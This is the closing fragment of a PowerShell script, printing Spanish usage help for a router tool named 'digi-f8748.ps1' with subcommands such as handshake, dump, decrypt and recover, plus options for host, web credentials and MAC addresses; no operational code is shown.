    Write-Host "digi-f8748 $VERSION - uso:"
    Write-Host "  .\digi-f8748.ps1 info | handshake | arm | dump | decrypt | verify | disarm | recover"
    Write-Host "  opciones: --host --web-user --web-pass --router-mac --client-mac --out -Keep -y no aplica"
  }
}
